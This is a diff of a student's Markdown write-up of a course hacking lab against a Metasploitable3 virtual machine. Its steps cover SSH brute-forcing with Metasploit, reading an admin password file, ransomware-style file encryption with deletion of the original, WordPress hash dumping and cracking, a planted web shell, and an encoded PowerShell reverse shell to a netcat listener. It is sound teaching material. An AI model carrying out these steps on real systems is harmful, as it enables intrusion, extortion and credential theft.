@@ -10,9 +10,6 @@
 
 My project consists in the execution of some attack steps on a vulnerable machine. The steps are small variations of some lab activities proposed in the "Hacking Lab" section of the course website. I set up two virtual machines, connected to the same network. The first one is a Kali Linux and it will execute the attack steps. The second one is Metasploitable3 Windows Server 2008, that will be our target. We log on the Metasploitable3 machine with the user account “vagrant” (password: vagrant), as a normal user would, and we start WampServer. We remain logged on until the end of the simulation.
 
-![fig. 1](images/fig1.png)  
-_Figure 1: The Markdown Mark_
-
 > The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
 > -- <cite>John Gruber</cite>
 
@@ -20,13 +17,8 @@ _Figure 1: The Markdown Mark_
 
 Firstly, we need to find the IP address and network number of our Kali machine. To do so we open a terminal in Kali Linux and we use the “ifconfig” command. We obtain two network interfaces (fig. 1). Let’s focus on the first one. Then we need to determine which other hosts are connected to this network. We can use the “nmap” command (fig. 1) with the network number of the interface that we obtained before. We obtain 3 IP addresses (fig. 1): the first one is the default gateway, because we notice that only the TCP port is open and the third one is our Kali machine (same IP address as in ifconfig). So, the second one is the target (IP 10.0.2.4).
 
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
-
+![fig. 1](images/fig1.png)  
+_Figure 1: _
 
 # Initial Access
 
@@ -34,25 +26,15 @@ Now that we have the IP address of the target machine, we could try connecting t
 Now we use the exploit “use auxiliary/scanner/ssh/ssh_enumusers”, after launching metasploit with the command “msfconsole -q”. Then we use the command “set RHOSTS 10.0.2.4” to set the target to be exploited and “set user_file dictionary.txt”. To run the exploit use “run”. We will obtain the list of valid usernames on the target that are also in the constructed dictionary. Now we select the username “vagrant” and we try to obtain the corresponding password by an online guessing attack using the exploit “use auxiliary/scanner/ssh/ssh_login”. We need to use the command “set RHOSTS 10.0.2.4” as before, then “set username vagrant” and finally “set pass_file dictionary.txt” (fig. 2). Then we run the exploit with “run”.
 We now open a connection to the SSH service with the command “ssh vagrant@10.0.2.4”. We insert the obtained password and we now have a SSH session, where we impersonate the user “vagrant”. By inserting the command “cmd” we get a Command Prompt.
 
+![fig. 2](images/fig2.png)  
+_Figure 2: _
 
 # Privilege Escalation
 
 Now we can search some text files in the target’s file system. Move to the Desktop directory with “cd”. After using the command “dir *.txt” we can see that there is a file called “password.txt”. If we read it with the command “type” we can then get the password of the Administrator account (fig.3). We can now perform Privilege Escalation by using this username and password to connect to the SSH service with the command “ssh Administrator@10.0.2.4”.
 
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
-
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
-
-renders to:
-
-___
-
----
-
-***
-
+![fig. 3](images/fig3.png)  
+_Figure31: _
 
 # Exfiltration
 
@@ -63,24 +45,35 @@ Once we have a SSH session, where we impersonate an account with high privileges
 We establish again a SSH session as before impersonating the user Administrator. Then use the command “cmd” and move to the Desktop directory with “cd” (fig. 4). Now let’s encrypt the file “important.pdf” on the target by using the following command: “7z a -pAtckPwd encrypted.7z important.pdf”. Instead of “AtckPwd” we should put a password that is at least 10 characters long and not in any dictionary (ex. k7h9Y?àX5$sP). This will prevent the defender from easily guessing our selected password. The target will now contain an encrypted file called “encrypted.7z” (fig. 4), that can be decrypted only using the correct password. The chosen password and the instructions to decrypt the file will be sent by the attacker to the target, after the ransom is paid. Finally, it’s important to delete the original file on the target by using the command “del”.
 Now just construct a text file containing the address of the Bitcoin wallet, where the money of the ransom can be sent to. We put this file on the Desktop of the target machine with the command “scp /home/kali/BitcoinAddress.txt Administrator@10.0.2.4:C:/Users/Administrator/Desktop/”.
 
+![fig. 4](images/fig4.png)  
+_Figure 4: _
+
 # Credential Access
 
 Now let’s try to obtain the credentials of the users of WordPress, a service running on the target's webserver. Firstly, we perform online guessing on the MySQL service with the same dictionary used before for the SSH service. To do so we use the command “msfconsole -q” and then “use auxiliary/scanner/mysql/mysql_login”. Now let’s use “set RHOSTS 10.0.2.4”, “set pass_file dictionary.txt” and “set user_file dictionary.txt” as before. After running the exploit with “run”, we observe that “root” is a valid username and the password is NULL. We use the obtained username and password to connect to the MySQL service with the command “mysql --user=root --password= --host=10.0.2.4”. Now we need to steal the hashes of the passwords of the users of WordPress. We use the commands “show databases;” and “use wordpress” to access the WordPress database. We are interested in the table that contains the information of the users. To access it we use the commands “show tables;” and “describe wp_users;” (fig. 5).
 
+![fig. 5](images/fig5.png)  
+_Figure 5: _
 
 Now let’s retrieve the usernames and password hashes from this table with the command “select concat_ws(':', user_login, user_pass) from wp_users;”. We copy and paste them in the text file “hashes.txt” (fig. 6).
 Now we can perform offline guessing on these WordPress password hashes with John the Ripper, using the command “john --format=phpass hashes.txt --wordlist=dictionary.txt”. Here PHPass is the format of the hash for WordPress. We use the same password dictionary as before for simplicity, even if we could directly use a hash dictionary, because the passwords are not salted. Using the command “john --show hashes.txt“, we can visualize the obtained cleartext passwords of the corresponding accounts (fig. 6).
+
+![fig. 6](images/fig6.png)  
+_Figure 6: _
 
 # Persistance
 
 We now need to find a method to obtain persistence on the target machine. This will allow us to maintain access to the target even if the passwords of the accounts are changed. To do so, we open a browser on the Kali machine and connect to the target's webserver on port number 8585 by entering http://10.0.2.4:8585/wordpress in the URL bar. The browser will show the home page of the WordPress site hosted on the target’s webserver. Now we click on the WordPress login page. Here we insert the obtained WordPress credentials of the “admin” user. Let’s click on “Appearance” and then “Editor”. Now search for “Theme Functions” under “Themes” on the right and click on it. Here we insert the PHP code of a simple web shell (fig. 7) and we click on “Update file”. This allows us to have access to a remote Command Prompt just by connecting to the webserver with a broswer. To do that we insert “10.0.2.4:8585/wordpress/?cmd=command” in the URL bar, but instead of “command” we can write whatever command we want. It will be very difficult for the defender to notice that there is a web shell running on his webserver, because its input and output will be hidden as common HTTPS traffic.
 
-
-The following snippet of text is _rendered as italicized text_.
+![fig. 7](images/fig7.png)  
+_Figure 7: _
 
 # Command&Control
 
 Now we can execute arbitrary commands on the target. But we don’t have an actual shell session running on the target. Moreover, the output of the arbitrary command is not visualized correctly. So, to overcome these problems and to be even more stealthy, we should execute a reverse shell on the target. The target will see this shell session as normal outbound HTTPS traffic. Firstly, we need to obtain the PowerShell script of a reverse shell from the Web (fig. 8). Inside the script we must insert the Kali machine’s IP as well as the port number (443). Let’s call this script “ReverseShell.ps1”. Then we must convert this code in Base64. This allows us to treat the script as a URL parameter. But before doing that, we create a text file “ReverseShell.txt” with the command “echo -n "powershell.exe -EncodedCommand " > ReverseShell.txt”, where we will append the script code encoded in Base64. To encode the script and then append it we use the command: “tr -d '\n' < ReverseShell.ps1 | iconv -f ASCII -t UTF-16LE | base64 -w 0 >> ReverseShell.txt”. Now we need to write this CMD command in a form that can be written in an URL. To do that we encode the command using “hURL -U -f  ReverseShell.txt“ and we copy the output. Now we need to open a server that is listening on the port number 443 on the Kali Linux machine. Just use the command “nc -nlvp 443”. Finally, we can enter “10.0.2.4:8585/wordpress/?cmd=” in the URL bar and paste the previously copied encoded CMD command after the ‘=’ sign. The target’s webserver will now act as a client and will connect to the Kali server on port number 443. We now have a CMD shell session where we can interact with the target machine. Thus, we got a Command&Control channel over HTTPS.
+
+![fig. 8](images/fig8.png)
+_Figure 8: _
 
 Interesting observation: We executed all the attack steps without the need for the Administrator to physically log on the target.
 
